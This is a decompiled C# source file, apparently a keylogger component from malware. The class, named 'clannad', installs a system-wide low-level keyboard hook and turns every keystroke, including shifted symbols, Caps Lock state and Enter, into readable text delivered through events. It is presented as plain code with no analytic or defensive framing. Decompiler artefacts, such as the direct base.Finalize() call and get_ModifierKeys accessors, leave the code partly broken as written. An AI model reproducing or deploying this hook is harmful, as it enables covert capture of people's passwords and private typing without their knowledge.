using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class clannad
{
	private delegate int KDel(int nCode, int wParam, ref KeyStructure lParam);

	public delegate void DownEventHandler(string Key);

	public delegate void UpEventHandler(string Key);

	private struct KeyStructure
	{
		public int Code;

		public int ScanCode;

		public int Flags;

		public int Time;

		public int ExtraInfo;
	}

	private static DownEventHandler DownEvent;

	private static UpEventHandler UpEvent;

	private static int Key;

	private static KDel KHD;

	public static event DownEventHandler Down
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		add
		{
			DownEvent = (DownEventHandler)Delegate.Combine(DownEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		remove
		{
			DownEvent = (DownEventHandler)Delegate.Remove(DownEvent, value);
		}
	}

	public static event UpEventHandler Up
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		add
		{
			UpEvent = (UpEventHandler)Delegate.Combine(UpEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		remove
		{
			UpEvent = (UpEventHandler)Delegate.Remove(UpEvent, value);
		}
	}

	[DebuggerNonUserCode]
	public clannad()
	{
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int Hook, KDel KeyDelegate, int HMod, int ThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int Hook, int nCode, int wParam, ref KeyStructure lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int Hook);

	public void CreateHook()
	{
		KHD = Proc;
		Key = SetWindowsHookExA(13, KHD, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
	}

	private int Proc(int Code, int wParam, ref KeyStructure lParam)
	{
		if (Code == 0)
		{
			switch (wParam)
			{
			case 256:
			case 260:
				DownEvent?.Invoke(Feed((Keys)lParam.Code));
				break;
			case 257:
			case 261:
				UpEvent?.Invoke(Feed((Keys)lParam.Code));
				break;
			}
		}
		return CallNextHookEx(Key, Code, wParam, ref lParam);
	}

	public void DiposeHook()
	{
		UnhookWindowsHookEx(Key);
		base.Finalize();
	}

	private string Feed(Keys e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Invalid comparison between Unknown and I4
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Invalid comparison between Unknown and I4
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Invalid comparison between Unknown and I4
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Invalid comparison between Unknown and I4
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Invalid comparison between Unknown and I4
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Invalid comparison between Unknown and I4
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Invalid comparison between Unknown and I4
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_0203: Invalid comparison between Unknown and I4
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Invalid comparison between Unknown and I4
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Invalid comparison between Unknown and I4
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_022d: Invalid comparison between Unknown and I4
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_0435: Unknown result type (might be due to invalid IL or missing references)
		//IL_0438: Invalid comparison between Unknown and I4
		//IL_0445: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e >= 65 && (int)e <= 90)
		{
			if (Control.IsKeyLocked((Keys)20) | ((Control.get_ModifierKeys() & 0x10000) != 0))
			{
				return ((Enum)e).ToString();
			}
			return ((Enum)e).ToString().ToLower();
		}
		if ((int)e >= 48 && (int)e <= 57)
		{
			if ((Control.get_ModifierKeys() & 0x10000) == 0)
			{
				return ((Enum)e).ToString().Replace("D", null);
			}
			switch (((Enum)e).ToString())
			{
			case "D1":
				return "!";
			case "D2":
				return "@";
			case "D3":
				return "#";
			case "D4":
				return "$";
			case "D5":
				return "%";
			case "D6":
				return "^";
			case "D7":
				return "&";
			case "D8":
				return "*";
			case "D9":
				return "(";
			case "D0":
				return ")";
			}
		}
		else
		{
			if ((int)e >= 96 && (int)e <= 105)
			{
				return ((Enum)e).ToString().Replace("NumPad", null);
			}
			if ((int)e >= 106 && (int)e <= 111)
			{
				switch (((Enum)e).ToString())
				{
				case "Divide":
					return "/";
				case "Multiply":
					return "*";
				case "Subtract":
					return "-";
				case "Add":
					return "+";
				case "Decimal":
					return ".";
				}
			}
			else
			{
				if ((int)e == 32)
				{
					return " ";
				}
				if ((int)e < 186 || (int)e > 222)
				{
					if ((int)e == 13)
					{
						return Environment.NewLine;
					}
					return "<" + ((Enum)e).ToString() + ">";
				}
				if ((Control.get_ModifierKeys() & 0x10000) != 0)
				{
					switch (((Enum)e).ToString())
					{
					case "OemMinus":
						return "_";
					case "Oemplus":
						return "+";
					case "OemOpenBrackets":
						return "{";
					case "Oem6":
						return "}";
					case "Oem5":
						return "|";
					case "Oem1":
						return ":";
					case "Oem7":
						return "\"";
					case "Oemcomma":
						return "<";
					case "OemPeriod":
						return ">";
					case "OemQuestion":
						return "?";
					case "Oemtilde":
						return "~";
					}
				}
				else
				{
					switch (((Enum)e).ToString())
					{
					case "OemMinus":
						return "-";
					case "Oemplus":
						return "=";
					case "OemOpenBrackets":
						return "[";
					case "Oem6":
						return "]";
					case "Oem5":
						return "\\";
					case "Oem1":
						return ";";
					case "Oem7":
						return "'";
					case "Oemcomma":
						return ",";
					case "OemPeriod":
						return ".";
					case "OemQuestion":
						return "/";
					case "Oemtilde":
						return "`";
					}
				}
			}
		}
		return null;
	}
}
